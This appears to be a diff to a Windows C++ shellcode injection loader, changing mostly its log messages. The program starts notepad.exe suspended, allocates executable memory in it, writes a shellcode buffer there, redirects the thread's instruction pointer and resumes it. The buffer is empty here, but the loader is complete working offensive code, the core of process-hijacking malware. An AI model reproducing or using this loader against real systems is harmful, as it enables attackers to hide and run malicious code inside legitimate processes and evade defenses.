@@ -7,7 +7,7 @@
 
 
 int main(int argc, char** argv) {
-    unsigned char shellcode[] = "";
+    char shellcode[] =  "";
 
     SIZE_T shell_size = sizeof(shellcode);
 
@@ -18,55 +18,55 @@ int main(int argc, char** argv) {
 
     // Create a Suspended Process
     if (!CreateProcessA(NULL, (LPSTR)"notepad.exe", NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, si, pi)) {
-        std::cout << "[-] Error creating process" << '\n';
+        std::cout << "[-] Failed to create process." << '\n';
         return 1;
     }
 
-    std::cout << "[+] Process created successfully" << '\n';
-    std::cout << "PID: " << pi->dwProcessId << '\n';
+    std::cout << "[+] Process created successfully." << '\n';
+    std::cout << "[*] PID: " << pi->dwProcessId << '\n';
 
     // Allocate Memory
     PVOID start = VirtualAllocEx(pi->hProcess, NULL, shell_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (start == NULL) {
-        std::cout << "[-] Memory allocation failure" << '\n';
+        std::cout << "[-] Failed to allocate memory in target process." << '\n';
         TerminateProcess(pi->hProcess, 0);
         return 1;
     }
-    std::cout << "[+] Memory allocation was successful" << '\n';
+    std::cout << "[+] Memory allocated successfully in target process." << '\n';
 
 
     // Write the Shell Code
     if (!WriteProcessMemory(pi->hProcess, start, shellcode, shell_size, NULL)) {
-        std::cout << "[-] Write Process Memory failed" << '\n';
+        std::cout << "[-] Failed to write shellcode to target process memory." << '\n';
         TerminateProcess(pi->hProcess, 0);
         return 1;
     }
-    std::cout << "[+] Memory write was successful" << '\n';
+    std::cout << "[+] Shellcode written to memory successfully." << '\n';
 
 
     // Get Thread Context
     CONTEXT ctx = {};
     ctx.ContextFlags = CONTEXT_FULL;
     if (!GetThreadContext(pi->hThread, &ctx)) {
-        std::cout<< "[-] Get Thread Context failed" << '\n';
+        std::cout << "[-] Failed to get thread context." << '\n';
         TerminateProcess(pi->hProcess, 0);
         return 1;
     }
-    std::cout << "[+] Get thread context successfully" << '\n';
+    std::cout << "[+] Retrieved thread context successfully." << '\n';
 
     // Set Thread Context
     ctx.Rip = (DWORD64)start;
     if (!SetThreadContext(pi->hThread, &ctx)) {
-        std::cout<< "[-] Failed to set thread context" << '\n';
+        std::cout << "[-] Failed to set thread context." << '\n';
         TerminateProcess(pi->hProcess, 0);
         return 1;
     }
-    std::cout << "[+] Set thread context successfully" << '\n';
+    std::cout << "[+] Set thread context successfully." << '\n';
 
     ResumeThread(pi->hThread);
-
 
     CloseHandle(pi->hThread);
     CloseHandle(pi->hProcess);
 
+    return 0;
 }
